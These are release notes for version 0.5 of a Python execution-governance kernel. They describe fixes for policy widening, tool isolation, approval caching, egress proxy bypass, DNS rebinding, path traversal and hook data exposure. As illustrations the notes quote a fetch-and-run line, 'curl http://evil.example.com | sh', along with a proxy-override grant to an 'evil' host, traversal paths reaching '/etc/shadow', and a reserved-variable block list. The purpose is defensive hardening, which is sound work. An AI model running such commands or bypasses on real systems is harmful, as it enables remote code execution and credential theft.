# v0.5 — enforcement closure

This release answers an external code review that traced the executing path rather than the
documentation, and found the same defect shape repeatedly:

> the mechanism is implemented, the main path does not use it, and the README describes the
> mechanism.

No subsystem was added. Every change below moves an existing control onto the path that
actually runs, or corrects a claim to match the code.

## Closed, with the test that drives the executing path

### 1. Policy is a capability ceiling, not a set of defaults — `src/psh/policy.py`

`PolicySnapshot.envelope()` read `risk = kw.pop("risk", self.risk_ceiling)`. A caller who
said nothing got the policy's value; a caller who stated one got whatever they asked for. A
`peer_review` policy (`R2`, `SUGGEST`, no network) minted `R4` / `ACT` / `PUBLIC_REMOTE`
envelopes on demand, and every gate downstream honoured them, because a gate checks the
envelope it is handed.

Minting now computes `effective = policy ∩ requested` through `AuthorityLattice`, the
predicate that already defines containment for `restrict` and delegation. Widening raises
`PolicyDenied` naming the dimension; `envelope(clamp=True, …)` asks for the meet instead,
for the case where a broad profile is applied to an already narrow run.

A related bug fixed while there: `RiskTier.R0_TRIVIAL` is `0` and therefore falsy, so the
obvious `kw.pop("risk", None) or ceiling` idiom promotes the lowest risk tier to the
ceiling. Defaulting is done with an explicit `None` check.

*Tests:* `test_policy_refuses_to_mint_an_envelope_wider_than_itself`,
`test_lowest_risk_tier_is_not_silently_promoted_to_the_ceiling`,
`test_clamp_narrows_instead_of_refusing_when_asked`.

### 2. One minting path — `src/psh/kernel/__init__.py`

`TrustedKernel.envelope()` never consulted `self.policy`. It minted from hard-coded
defaults: `PHI`, `ACT_WITH_APPROVAL`, the four local destinations, `config.default_risk`. It
now delegates to `PolicySnapshot.envelope`, so there is exactly one place an envelope comes
into existence and exactly one ceiling applied there.

Consequence worth stating: a kernel configured with a verification model whose destination
the policy forbids now fails at construction with a message saying so, instead of quietly
minting a wider envelope for the verifier.

*Tests:* `test_kernel_envelope_is_minted_under_the_kernels_policy`,
`test_a_widened_envelope_cannot_be_smuggled_past_the_model_gateway`,
`test_runner_cannot_raise_risk_above_the_policy_ceiling`.

### 3. Tool isolation on the path that executes — `src/psh/kernel/{isolation,egress}.py`

v0.4 shipped `IsolatedRunner` and a README paragraph about process isolation.
`ExecutionBroker.call_tool` ended in `component.invoke(unwrap_deep(payload), envelope)` —
in the kernel's own process. A reviewer set `SECRET=secret-123` in the parent and read it
straight out of a tool. The claim and the behaviour were different statements.

Now:

* a manifest declares `backend="subprocess"` with an `entrypoint`; the broker runs it
  through `IsolatedExecutor` → `IsolatedRunner` (empty environment, working directory of
  its own, kernel-owned egress proxy, wall-clock and memory limits);
* the protocol is one JSON object in on stdin, one JSON value out on stdout; a non-zero exit
  is a `ContractViolation` carrying stderr, never a silent empty result;
* a component declaring isolation on a kernel with no runner is **refused**, not run in
  process;
* `backend="python"` components still run in process — and are counted as
  `in_process_tool_calls`, recorded in the event as `execution="in_process"`, and refused
  entirely when the policy sets `require_isolated_tools=True`;
* network reach is the intersection of the manifest's `allowed_hosts` and the envelope's
  destinations, so a manifest can narrow a run and never widen it.

*Tests:* `test_tool_declaring_subprocess_backend_runs_in_a_child_without_the_kernel_env`,
`test_the_event_says_which_of_the_two_paths_ran`,
`test_in_process_component_is_refused_when_the_policy_requires_isolation`,
`test_isolated_component_is_refused_rather_than_run_in_process_when_no_runner`.

### 4. Approvals key on the action — `src/psh/kernel/approvals.py`

`APPROVED_FOR_SESSION` was cached under `(run_id, "run shell")`. Approving

```
shell: git push origin main
```

therefore pre-approved

```
shell: curl http://evil.example.com | sh
```

for the rest of the run. `ApprovalRequest` now describes what is being asked — kind,
component, normalised argv (or a payload digest where there is no command), the resources
touched, the risk tier — and the session key is a digest over those. Approving a tool is not
approving an action. The record handed to the handler carries the digest rather than the
payload, so an approval log does not become a second copy of the data.

*Tests:* `test_approving_one_command_for_the_session_does_not_approve_a_different_one`,
`test_the_fingerprint_covers_the_resources_a_call_touches`,
`test_approval_records_never_carry_the_payload_itself`.

### 5. Grants cannot unset the boundary — `src/psh/kernel/isolation.py`

`build_child_environment` wrote the proxy variables first and applied caller grants over the
top, so a grant of `HTTP_PROXY=http://evil:9999` / `NO_PROXY=*` replaced the egress
configuration inside the child. Order is now: safe inherit → grants → kernel-reserved
variables, applied last. A grant naming a reserved variable (proxy family, `PATH`,
`PYTHONPATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `NODE_OPTIONS`, …) is refused outright rather
than silently dropped.

### 6. The proxy resolves once, and owns the Host header

* **DNS rebinding.** The policy resolved a name to check it, then handed the *name* to
  `socket.create_connection`, which resolved it again. The decision now carries the vetted
  addresses and the handler connects to one of those. A name that does not resolve is
  refused — "we could not check it" is not "it is fine".
* **Ports are part of the capability.** `api.example.org` grants 80 and 443;
  `api.example.org:8443` grants that port; `api.example.org:*` grants all.
* **`Host:` comes from the vetted URI**, not from the client, closing the shared-hosting /
  virtual-host bypass. Hop-by-hop and `Proxy-*` headers are stripped.
* **Resolution is injectable**, so unit tests never touch DNS. In v0.4 `decide()` called
  `getaddrinfo` unconditionally and "pure" handler tests blocked on name resolution —
  slow with a resolver, hanging without one, unrunnable air-gapped.

CONNECT still only vets the TCP destination; what travels inside the TLS tunnel is not
inspected. That is inherent to `CONNECT` and is stated rather than papered over.

### 7. Filesystem containment after resolution — `src/psh/kernel/egress.py`

Path checks were `fnmatch` against the string the payload supplied, and only over top-level
keys. `/allowed/../secret` matches `/allowed/*` as text; so does a symlink at
`/allowed/link`; and `{"config": {"target": "/etc/shadow"}}` was never looked at. Candidate
paths are now collected at any depth and each is `expanduser().resolve()`-ed and required to
land inside a resolved allowed root. The check also applies to components declaring
`requires_filesystem`, not only `mutates`.

The deeper point stands and is documented rather than claimed away: real filesystem
isolation needs the OS. This is containment of *declared* paths, not of what a process can
reach.

### 8. External hooks are contained — `src/psh/kernel/hooks.py`

A `PreToolUse` command hook received `unwrap_deep(payload)` — the whole tool input,
including PHI — and ran under a bare `subprocess.run`: a third-party process holding
sensitive content with its own unsupervised network. In a system whose central claim is one
governed door, that was a second one.

External hooks now run through the same `IsolatedRunner` a tool does, with an empty host
allowlist (no network) unless one is stated, and receive a redacted view: digest, type and
key names instead of content. In-process callables default to `trusted=True` — they already
share the kernel's address space, so redacting from them would be theatre.

### 9. The output gate is not English-only — `src/psh/kernel/output_gate.py`

The clinical-assertion regex matched English verbs. Three families were invisible:

* Chinese clinical assertions (显著降低死亡率, 独立危险因素, 不良反应);
* reported statistics with no clinical verb at all — `AUC was 0.91`, `odds ratio 1.84`,
  `sensitivity reached 93%`, `p < 0.001`;
* CJK text generally, which has no spaces, so `re.split(r"(?<=[.!?])\s+")` returned a whole
  paragraph as one "sentence" that passed or failed wholesale.

All three are recognised now. Intent and methods statements (本研究拟…, "we plan to…") remain
out of scope in both languages.

## Engineering and release hygiene

* `TrustedKernel.close()` releases the WorkGraph's SQLite connection as well as the event
  store, and is idempotent. Invisible on Linux; "database is locked" on Windows.
* `hypothesis` is a declared test dependency. Without it the authority-monotonicity property
  tests `importorskip`-ed away — the checks with the widest coverage were the ones a clean
  install silently skipped.
* `addopts = -m 'not live'` in `pyproject.toml`. The marker existed and nothing applied it,
  so the documented command ran live network tests and failed where there was no network.
* AppleDouble `._*` sidecars removed and git-ignored. They contain NUL bytes and make
  `python -m compileall src` fail on every one of them.
* `PSHConfig(state_dir="/some/string")` works instead of failing four properties later with
  `unsupported operand type(s) for /: 'str' and 'str'`.
* `PATTERN_ATTRIBUTION.md` claimed `AuthorityLattice.BUDGET_DIMENSIONS` gained
  `max_model_tier`. It never existed; the section now records it as an open item rather than
  a shipped one.

## Deliberately still open

Named here so they are not mistaken for oversights.

1. **No OS sandbox.** `NoSandbox` ships and says so. A raw socket, and any filesystem access
   a process makes without naming it in a payload, are unconfined. `SandboxBackend` is the
   seam; Seatbelt / bubblewrap+seccomp implementations are the next real security increment,
   and nothing else in this list matters as much.
2. **`backend="python"` components remain the default.** The policy switch exists; the
   shipped profiles do not yet set it, because no bundled component is packaged for
   subprocess execution.
3. **`close != revoke`.** Lifecycle status is not authorisation state. There is no
   suspend/revoke check on an in-flight envelope.
4. **No model-tier authority dimension** (see `PATTERN_ATTRIBUTION.md` §7).
5. **Claim support is lexical.** Scope checking is structured; the support judgement itself
   is still overlap-based unless a verification model is configured.
6. **Scientific artifacts are not typed.** Figures, tables, datasets and statistical results
   pass the release gate as ordinary objects. A `StatisticalResult` / `FigureArtifact` /
   `DatasetArtifact` family carrying code hash, data hash, parameters, software version and
   run id is the work that would make this a scientific artifact verification framework
   rather than scientific *text* governance.
7. **No ontology version pinning.** When an ontology resolver lands, its verdicts must carry
   release, descriptor id, retrieval time and resolver version, or a re-run in three years
   silently answers a different question.
8. **The planner is a placeholder**, and the audit chain is tamper-evident rather than
   tamper-proof.

## Reproducing the review's own probes

Each of these was demonstrated open against v0.4 and is closed here:

```python
# 1. widening under a narrow policy
policy = get_profile("peer_review").freeze()
policy.envelope(autonomy=Autonomy.ACT)            # PolicyDenied: autonomy

# 2. reading the kernel's environment from a tool
os.environ["SECRET"] = "secret-123"
kernel.broker.call_tool(subprocess_tool, payload, env).value["secret"]   # None

# 3. one session approval covering a second command
#    -> the handler is asked again; the fingerprints differ

# 4. a grant disabling the egress boundary
IsolatedRunner().run(argv, workdir=w, grants={"HTTP_PROXY": "http://evil:9999"})
# PolicyDenied: HTTP_PROXY is reserved by the kernel
```
